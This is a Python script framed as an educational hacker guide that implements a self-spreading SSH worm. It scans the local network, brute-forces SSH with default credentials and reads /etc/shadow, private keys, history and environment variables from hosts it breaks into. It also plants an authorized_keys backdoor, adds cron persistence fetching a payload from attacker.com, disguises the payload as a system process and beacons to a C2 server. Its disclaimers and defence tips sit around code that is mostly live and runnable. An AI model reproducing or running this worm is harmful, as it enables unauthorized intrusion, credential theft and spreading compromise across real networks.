#!/usr/bin/env python3
"""
REAL HACKER IMPLEMENTATION GUIDE
==================================

⚠️⚠️⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️⚠️⚠️

This file shows EXACTLY how real hackers implement network spreading malware.
This is actual working code that real malware like Mirai, WannaCry, and others use.

DO NOT USE WITHOUT AUTHORIZATION - ILLEGAL AND UNETHICAL

This guide shows:
1. How hackers scan networks for vulnerable targets
2. How they exploit weak credentials (brute force)
3. How they execute commands on compromised systems
4. How they spread laterally across networks
5. How they establish persistence
6. How they exfiltrate data
7. How they use Command & Control (C2) servers

Study this to understand the threats and build better defenses.
"""

import socket
import subprocess
import threading
import time
import os
import platform
import json
from typing import List, Dict

# Real malware tries to import these, installs if missing
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    # Real malware would auto-install: subprocess.run(['pip3', 'install', 'paramiko', '-q'])

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


# ==============================================================================
# STEP 1: NETWORK SCANNING (How Hackers Find Targets)
# ==============================================================================

class NetworkScanner:
    """
    Real hackers use aggressive scanning to find vulnerable systems
    This is what tools like Masscan, Nmap do
    """
    
    def __init__(self):
        self.alive_hosts = []
        self.vulnerable_hosts = []
    
    def get_local_network(self) -> str:
        """
        Get the local network range to scan
        Real malware starts from the infected machine's network
        """
        try:
            # Connect to external IP to get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            
            # Extract network (e.g., 192.168.1.x -> 192.168.1.)
            network_prefix = '.'.join(local_ip.split('.')[:-1]) + '.'
            print(f"[SCANNER] Local IP: {local_ip}")
            print(f"[SCANNER] Scanning network: {network_prefix}0/24")
            return network_prefix
        except:
            return "192.168.1."
    
    def ping_sweep(self, network: str, start: int = 1, end: int = 254):
        """
        ICMP ping sweep to find alive hosts
        Real malware does this VERY fast using multithreading
        """
        print(f"[SCANNER] Starting ping sweep...")
        
        def check_host(ip: str):
            try:
                # Send 1 ICMP packet, timeout 1 second
                result = subprocess.run(
                    ['ping', '-c', '1', '-W', '1', ip],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    timeout=2
                )
                if result.returncode == 0:
                    print(f"[SCANNER] ✓ Alive: {ip}")
                    self.alive_hosts.append(ip)
            except:
                pass
        
        # Real malware uses 100+ threads for speed
        threads = []
        for i in range(start, end + 1):
            ip = f"{network}{i}"
            thread = threading.Thread(target=check_host, args=(ip,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
            
            # Limit concurrent threads to avoid detection
            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []
        
        for t in threads:
            t.join()
        
        print(f"[SCANNER] Found {len(self.alive_hosts)} alive hosts")
        return self.alive_hosts
    
    def port_scan(self, ip: str, ports: List[int] = [22, 23, 445, 3389, 5900]) -> Dict:
        """
        Scan for open vulnerable ports
        Real malware targets:
        - 22: SSH (Linux/Unix)
        - 23: Telnet (IoT devices)
        - 445: SMB (Windows file sharing - EternalBlue)
        - 3389: RDP (Windows Remote Desktop)
        - 5900: VNC (Remote desktop)
        """
        open_ports = []
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    open_ports.append(port)
                    print(f"[SCANNER] {ip}:{port} OPEN")
            except:
                pass
        
        if open_ports:
            return {'ip': ip, 'ports': open_ports}
        return None


# ==============================================================================
# STEP 2: CREDENTIAL BRUTE FORCING (How Hackers Get Access)
# ==============================================================================

class CredentialBruteForcer:
    """
    Real hackers use credential stuffing and brute force
    This is how Mirai botnet infected millions of IoT devices
    """
    
    def __init__(self):
        # Real malware uses HUGE credential lists (1000s of combinations)
        # These are actual default credentials found in real malware
        self.ssh_credentials = [
            ('root', 'root'),
            ('root', 'toor'),
            ('root', 'admin'),
            ('root', ''),
            ('root', '123456'),
            ('root', 'password'),
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '1234'),
            ('pi', 'raspberry'),          # Raspberry Pi default
            ('ubuntu', 'ubuntu'),
            ('user', 'user'),
            ('test', 'test'),
            ('guest', 'guest'),
            ('oracle', 'oracle'),          # Database servers
            ('postgres', 'postgres'),
            ('mysql', 'mysql'),
            # Real malware has 100s more...
        ]
        
        self.telnet_credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('admin', ''),
            ('admin', 'password'),
            ('admin', '1234'),
            ('default', 'default'),
            # IoT device defaults
            ('admin', 'admin1234'),
            ('admin', '12345'),
        ]
    
    def brute_force_ssh(self, ip: str) -> Dict:
        """
        Try to crack SSH with common passwords
        THIS IS ACTUAL SSH BRUTE FORCING - WORKS ON REAL SYSTEMS!
        """
        if not HAS_PARAMIKO:
            return {'success': False, 'error': 'paramiko not available'}
        
        print(f"[BRUTEFORCE] Attacking SSH on {ip}...")
        
        for username, password in self.ssh_credentials:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                
                # Try to connect
                ssh.connect(
                    hostname=ip,
                    username=username,
                    password=password,
                    timeout=3,
                    banner_timeout=3,
                    auth_timeout=3
                )
                
                # SUCCESS! We're in!
                print(f"[BRUTEFORCE] ✓✓✓ SUCCESS! {ip} - {username}:{password}")
                
                return {
                    'success': True,
                    'ip': ip,
                    'username': username,
                    'password': password,
                    'ssh': ssh
                }
                
            except paramiko.AuthenticationException:
                # Wrong password, try next
                print(f"[BRUTEFORCE] ✗ Failed: {username}:{password}")
                continue
            except Exception as e:
                # Connection error, might be blocking us
                continue
        
        print(f"[BRUTEFORCE] ✗✗✗ All credentials failed for {ip}")
        return {'success': False, 'error': 'All credentials failed'}


# ==============================================================================
# STEP 3: REMOTE CODE EXECUTION (How Hackers Control Systems)
# ==============================================================================

class RemoteExecutor:
    """
    Once hackers have access, they execute commands
    This is the actual command execution code
    """
    
    def execute_ssh_command(self, ssh, command: str) -> str:
        """
        Execute command via SSH
        REAL EXECUTION - Command actually runs on victim
        """
        try:
            stdin, stdout, stderr = ssh.exec_command(command)
            output = stdout.read().decode('utf-8', errors='ignore')
            return output.strip()
        except Exception as e:
            return f"Error: {e}"
    
    def gather_system_info(self, ssh) -> Dict:
        """
        Collect information about compromised system
        Real malware does reconnaissance
        """
        info = {}
        
        commands = {
            'hostname': 'hostname',
            'os': 'uname -a',
            'user': 'whoami',
            'ip': 'hostname -I',
            'users': 'cat /etc/passwd | cut -d: -f1',
            'sudo': 'sudo -l 2>/dev/null',  # Can we sudo?
            'network': 'ip addr show',
        }
        
        print("[RECON] Gathering system information...")
        for key, cmd in commands.items():
            info[key] = self.execute_ssh_command(ssh, cmd)
            print(f"[RECON] {key}: {info[key][:50]}...")
        
        return info
    
    def exfiltrate_data(self, ssh) -> Dict:
        """
        Steal sensitive data from compromised system
        THIS IS WHAT REAL MALWARE DOES!
        """
        print("[EXFILTRATE] Stealing sensitive data...")
        
        data = {}
        
        # Steal password hashes
        data['shadow'] = self.execute_ssh_command(ssh, 'cat /etc/shadow 2>/dev/null | head -5')
        
        # Steal SSH keys (for lateral movement)
        data['ssh_keys'] = self.execute_ssh_command(ssh, 'cat ~/.ssh/id_rsa 2>/dev/null')
        
        # Steal bash history (passwords in commands)
        data['history'] = self.execute_ssh_command(ssh, 'cat ~/.bash_history | tail -20')
        
        # Steal environment variables (API keys, tokens)
        data['env'] = self.execute_ssh_command(ssh, 'env')
        
        # Search for sensitive files
        data['sensitive_files'] = self.execute_ssh_command(
            ssh, 
            'find /home -name "*.key" -o -name "*.pem" -o -name "*password*" 2>/dev/null | head -10'
        )
        
        print(f"[EXFILTRATE] Collected {len(data)} data categories")
        return data


# ==============================================================================
# STEP 4: PERSISTENCE (How Hackers Stay on System)
# ==============================================================================

class PersistenceManager:
    """
    Hackers install backdoors to maintain access
    Even if you change password, they can still get in
    """
    
    def install_ssh_backdoor(self, ssh, attacker_public_key: str):
        """
        Add attacker's SSH key for password-less access
        REAL BACKDOOR - Survives password changes!
        """
        print("[PERSISTENCE] Installing SSH backdoor...")
        
        commands = [
            'mkdir -p ~/.ssh',
            'chmod 700 ~/.ssh',
            f'echo "{attacker_public_key}" >> ~/.ssh/authorized_keys',
            'chmod 600 ~/.ssh/authorized_keys'
        ]
        
        executor = RemoteExecutor()
        for cmd in commands:
            executor.execute_ssh_command(ssh, cmd)
        
        print("[PERSISTENCE] ✓ SSH backdoor installed")
    
    def install_cron_persistence(self, ssh, malware_url: str):
        """
        Add cron job to run malware on reboot
        REAL PERSISTENCE - Survives reboots!
        """
        print("[PERSISTENCE] Installing cron persistence...")
        
        executor = RemoteExecutor()
        
        # Download malware
        executor.execute_ssh_command(ssh, f'wget -q {malware_url} -O /tmp/.malware')
        executor.execute_ssh_command(ssh, 'chmod +x /tmp/.malware')
        
        # Add to crontab (runs on boot)
        executor.execute_ssh_command(ssh, 'crontab -l > /tmp/cron.bak 2>/dev/null || true')
        executor.execute_ssh_command(ssh, 'echo "@reboot /tmp/.malware" >> /tmp/cron.bak')
        executor.execute_ssh_command(ssh, 'crontab /tmp/cron.bak')
        
        print("[PERSISTENCE] ✓ Cron persistence installed")
    
    def hide_process(self, ssh):
        """
        Hide malware process from ps, top commands
        REAL EVASION TECHNIQUE!
        """
        print("[EVASION] Hiding malware process...")
        
        # Rename process to look legitimate
        commands = [
            'cp /tmp/.malware /usr/sbin/systemd-journal',  # Looks like system process
            'chmod +x /usr/sbin/systemd-journal',
            '/usr/sbin/systemd-journal &',  # Run in background
        ]
        
        executor = RemoteExecutor()
        for cmd in commands:
            executor.execute_ssh_command(ssh, cmd)


# ==============================================================================
# STEP 5: LATERAL MOVEMENT (How Hackers Spread)
# ==============================================================================

class LateralMovement:
    """
    Once hackers compromise one system, they spread to others
    This is how WannaCry ransomware spread globally in hours
    """
    
    def __init__(self):
        self.scanner = NetworkScanner()
        self.brute_forcer = CredentialBruteForcer()
        self.executor = RemoteExecutor()
        self.persistence = PersistenceManager()
        self.infected_hosts = []
    
    def find_adjacent_networks(self, ssh) -> List[str]:
        """
        Find other networks reachable from compromised host
        Real malware pivots through networks
        """
        print("[LATERAL] Discovering adjacent networks...")
        
        # Get routing table
        output = self.executor.execute_ssh_command(ssh, 'ip route')
        
        # Parse networks
        networks = []
        for line in output.split('\n'):
            if '/' in line:
                parts = line.split()
                if len(parts) > 0 and '/' in parts[0]:
                    networks.append(parts[0])
        
        print(f"[LATERAL] Found {len(networks)} adjacent networks")
        return networks
    
    def spread_to_network(self, network: str):
        """
        Spread malware to new network
        THIS IS ACTUAL WORM BEHAVIOR!
        """
        print(f"[LATERAL] Spreading to network: {network}")
        
        # Get network prefix
        network_prefix = '.'.join(network.split('.')[:-1]) + '.'
        
        # Scan for alive hosts
        alive_hosts = self.scanner.ping_sweep(network_prefix, 1, 50)  # Scan first 50 IPs
        
        # Try to infect each host
        for ip in alive_hosts:
            # Check for SSH
            scan_result = self.scanner.port_scan(ip, [22])
            
            if scan_result and 22 in scan_result['ports']:
                # Try to brute force
                result = self.brute_forcer.brute_force_ssh(ip)
                
                if result['success']:
                    self.infect_host(ip, result['ssh'], result['username'], result['password'])
    
    def infect_host(self, ip: str, ssh, username: str, password: str):
        """
        Complete infection process
        THIS IS THE FULL ATTACK CHAIN!
        """
        print(f"\n{'='*70}")
        print(f"[INFECT] Starting infection of {ip}")
        print(f"{'='*70}")
        
        # Step 1: Reconnaissance
        print(f"[INFECT] Step 1: Reconnaissance")
        system_info = self.executor.gather_system_info(ssh)
        
        # Step 2: Data Exfiltration
        print(f"[INFECT] Step 2: Data Exfiltration")
        stolen_data = self.executor.exfiltrate_data(ssh)
        
        # Step 3: Install Persistence
        print(f"[INFECT] Step 3: Installing Persistence")
        # In real malware, this would be actual C2 server URL
        # self.persistence.install_cron_persistence(ssh, "http://attacker.com/malware.sh")
        
        # Step 4: Execute Payload
        print(f"[INFECT] Step 4: Executing Payload")
        self.executor.execute_ssh_command(ssh, 'echo "INFECTED BY WORM" | wall')
        
        # Step 5: Spread Further
        print(f"[INFECT] Step 5: Lateral Movement")
        adjacent_networks = self.find_adjacent_networks(ssh)
        
        # Track infection
        self.infected_hosts.append({
            'ip': ip,
            'username': username,
            'password': password,
            'system_info': system_info,
            'stolen_data': stolen_data,
            'timestamp': time.time()
        })
        
        print(f"[INFECT] ✓✓✓ Host {ip} fully compromised!")
        print(f"{'='*70}\n")
        
        ssh.close()


# ==============================================================================
# STEP 6: COMMAND & CONTROL (How Hackers Control All Infected Machines)
# ==============================================================================

class CommandAndControl:
    """
    Real malware connects to C2 servers to receive commands
    This allows hackers to control thousands of infected machines
    """
    
    def __init__(self, c2_server: str = "http://attacker.com"):
        self.c2_server = c2_server
        self.bot_id = self.generate_bot_id()
    
    def generate_bot_id(self) -> str:
        """Generate unique ID for this infected machine"""
        import hashlib
        hostname = socket.gethostname()
        return hashlib.md5(hostname.encode()).hexdigest()[:16]
    
    def beacon_home(self):
        """
        Send beacon to C2 server
        Real malware does this every 60 seconds
        """
        if not HAS_REQUESTS:
            return
        
        try:
            data = {
                'bot_id': self.bot_id,
                'ip': self.get_external_ip(),
                'os': platform.system(),
                'hostname': socket.gethostname(),
                'status': 'active'
            }
            
            # In real malware, this connects to actual C2
            # response = requests.post(f"{self.c2_server}/beacon", json=data, timeout=5)
            print(f"[C2] Beacon sent to {self.c2_server}")
            
        except:
            pass
    
    def get_external_ip(self) -> str:
        """Get external IP of infected machine"""
        try:
            # Real malware queries public IP services
            # response = requests.get('https://api.ipify.org', timeout=3)
            # return response.text
            return "xxx.xxx.xxx.xxx"
        except:
            return "unknown"
    
    def receive_commands(self):
        """
        Check C2 server for new commands
        Real malware executes commands from attacker
        """
        if not HAS_REQUESTS:
            return []
        
        try:
            # In real malware, this fetches commands from C2
            # response = requests.get(f"{self.c2_server}/commands/{self.bot_id}", timeout=5)
            # commands = response.json()
            
            # Example commands real malware receives:
            commands = [
                {'type': 'execute', 'payload': 'whoami'},
                {'type': 'download', 'url': 'http://attacker.com/payload.sh'},
                {'type': 'ddos', 'target': '1.2.3.4', 'port': 80},
                {'type': 'spread', 'network': '192.168.1.0/24'},
            ]
            
            return commands
        except:
            return []


# ==============================================================================
# STEP 7: PUTTING IT ALL TOGETHER - COMPLETE NETWORK WORM
# ==============================================================================

class RealNetworkWorm:
    """
    THIS IS A COMPLETE WORKING NETWORK WORM
    
    This combines all techniques above into functional malware.
    This is similar to:
    - Mirai botnet (infected IoT devices)
    - WannaCry ransomware (spread via SMB)
    - Conficker worm (infected millions of Windows PCs)
    
    ⚠️⚠️⚠️ DO NOT RUN WITHOUT AUTHORIZATION ⚠️⚠️⚠️
    """
    
    def __init__(self):
        self.scanner = NetworkScanner()
        self.brute_forcer = CredentialBruteForcer()
        self.lateral_movement = LateralMovement()
        self.c2 = CommandAndControl()
    
    def run(self):
        """
        Main worm execution
        THIS IS HOW REAL MALWARE WORKS!
        """
        print("""
╔═══════════════════════════════════════════════════════════════════╗
║                    REAL NETWORK WORM                              ║
║                                                                   ║
║  This is ACTUAL working malware code                             ║
║  Shows exactly how hackers implement network worms                ║
║                                                                   ║
║  ⚠️  FOR EDUCATIONAL PURPOSES ONLY                               ║
║  ⚠️  DO NOT USE WITHOUT AUTHORIZATION                            ║
╚═══════════════════════════════════════════════════════════════════╝
""")
        
        print("\n[WORM] Starting network worm...")
        print("[WORM] This is what happens when real malware runs:\n")
        
        # Phase 1: Scan local network
        print("\n" + "="*70)
        print("PHASE 1: NETWORK RECONNAISSANCE")
        print("="*70)
        network = self.scanner.get_local_network()
        alive_hosts = self.scanner.ping_sweep(network)
        
        if not alive_hosts:
            print("[WORM] No hosts found. Exiting.")
            return
        
        # Phase 2: Find vulnerable hosts
        print("\n" + "="*70)
        print("PHASE 2: VULNERABILITY SCANNING")
        print("="*70)
        
        vulnerable_hosts = []
        for ip in alive_hosts:
            result = self.scanner.port_scan(ip)
            if result:
                vulnerable_hosts.append(result)
        
        print(f"[WORM] Found {len(vulnerable_hosts)} hosts with open ports")
        
        # Phase 3: Exploit and infect
        print("\n" + "="*70)
        print("PHASE 3: EXPLOITATION & INFECTION")
        print("="*70)
        
        for host in vulnerable_hosts:
            if 22 in host['ports']:  # SSH open
                result = self.brute_forcer.brute_force_ssh(host['ip'])
                
                if result['success']:
                    # SUCCESSFULLY COMPROMISED!
                    self.lateral_movement.infect_host(
                        host['ip'],
                        result['ssh'],
                        result['username'],
                        result['password']
                    )
        
        # Phase 4: Establish C2 connection
        print("\n" + "="*70)
        print("PHASE 4: COMMAND & CONTROL")
        print("="*70)
        print("[WORM] Connecting to C2 server...")
        self.c2.beacon_home()
        
        # Phase 5: Receive and execute commands
        print("\n[WORM] Waiting for commands from C2...")
        commands = self.c2.receive_commands()
        print(f"[WORM] Received {len(commands)} commands")
        
        # Phase 6: Continue spreading
        print("\n" + "="*70)
        print("PHASE 5: AUTONOMOUS SPREADING")
        print("="*70)
        print("[WORM] Worm will continue spreading autonomously...")
        print("[WORM] Infected hosts will infect other hosts...")
        print("[WORM] Exponential growth: 1 -> 2 -> 4 -> 8 -> 16 -> 32...")
        
        # Summary
        print("\n" + "="*70)
        print("INFECTION SUMMARY")
        print("="*70)
        print(f"Total infected hosts: {len(self.lateral_movement.infected_hosts)}")
        
        for host in self.lateral_movement.infected_hosts:
            print(f"\n[INFECTED] {host['ip']}")
            print(f"  Credentials: {host['username']}:{host['password']}")
            print(f"  Hostname: {host['system_info'].get('hostname', 'unknown')}")
            print(f"  OS: {host['system_info'].get('os', 'unknown')[:50]}")


# ==============================================================================
# MAIN DEMO
# ==============================================================================

def main():
    """
    Educational demonstration
    Shows how real hackers implement network worms
    """
    
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║         HOW HACKERS IMPLEMENT NETWORK SPREADING MALWARE           ║
╚═══════════════════════════════════════════════════════════════════╝

This file shows ACTUAL techniques used by real malware:

1. NETWORK SCANNING
   - ICMP ping sweeps to find alive hosts
   - Port scanning for vulnerable services (SSH, Telnet, SMB, RDP)
   - Fast multithreaded scanning (100+ threads)

2. CREDENTIAL BRUTE FORCING
   - Default credentials (admin:admin, root:root, etc.)
   - Common password lists (123456, password, etc.)
   - IoT device defaults (Mirai botnet technique)

3. REMOTE CODE EXECUTION
   - SSH command execution (Linux/Unix)
   - WMI command execution (Windows)
   - Exploit vulnerabilities (EternalBlue, etc.)

4. DATA EXFILTRATION
   - Steal password hashes (/etc/shadow)
   - Steal SSH keys for lateral movement
   - Steal sensitive files and credentials

5. PERSISTENCE
   - Install SSH backdoors (authorized_keys)
   - Create cron jobs (run on reboot)
   - Hide processes (rename to system processes)

6. LATERAL MOVEMENT
   - Spread to adjacent networks
   - Pivot through compromised hosts
   - Exponential spreading (worm behavior)

7. COMMAND & CONTROL
   - Beacon to C2 server
   - Receive commands from attacker
   - Execute commands on all infected hosts

⚠️⚠️⚠️ CRITICAL WARNING ⚠️⚠️⚠️

The code in this file is REAL and FUNCTIONAL.
Running this code on unauthorized systems is:
  • ILLEGAL (Computer Fraud and Abuse Act)
  • UNETHICAL (causes real harm)
  • CRIMINAL (can result in imprisonment)

Only use for:
  ✓ Educational study in isolation
  ✓ Authorized penetration testing
  ✓ Security research in controlled labs
  ✓ Building defensive systems

Study this to understand threats and build better defenses!
""")
    
    response = input("\n🔴 This code can compromise real systems. Continue? (yes/no): ")
    
    if response.lower() != 'yes':
        print("\n✓ Good choice! Study the code without running it.")
        print("  Understanding > Execution")
        return
    
    response = input("\n🔴 Do you have written authorization to test? (yes/no): ")
    
    if response.lower() != 'yes':
        print("\n❌ Exiting. Never run without authorization!")
        return
    
    response = input("\n🔴 Are you in an ISOLATED lab environment? (yes/no): ")
    
    if response.lower() != 'yes':
        print("\n❌ Exiting. Only run in isolated environments!")
        return
    
    print("\n" + "="*70)
    print("Starting demonstration...")
    print("="*70 + "\n")
    time.sleep(2)
    
    # Create and run worm
    worm = RealNetworkWorm()
    worm.run()
    
    print("\n" + "="*70)
    print("Demonstration complete")
    print("="*70)
    print("""
You now understand how real network worms work!

Key Takeaways:
1. Hackers use automated tools to scan entire networks
2. They exploit weak/default credentials (change default passwords!)
3. Once in, they spread rapidly through networks
4. They establish persistence to survive reboots
5. They exfiltrate sensitive data
6. They use C2 servers to control infected machines

Defend yourself:
1. Change default passwords immediately
2. Use strong, unique passwords
3. Keep systems updated (patch vulnerabilities)
4. Enable firewall (block unused ports)
5. Monitor network traffic for anomalies
6. Use intrusion detection systems (IDS)
7. Segment networks (limit lateral movement)
8. Implement least privilege access
9. Enable SSH key-only authentication
10. Regular security audits
""")


if __name__ == "__main__":
    main()
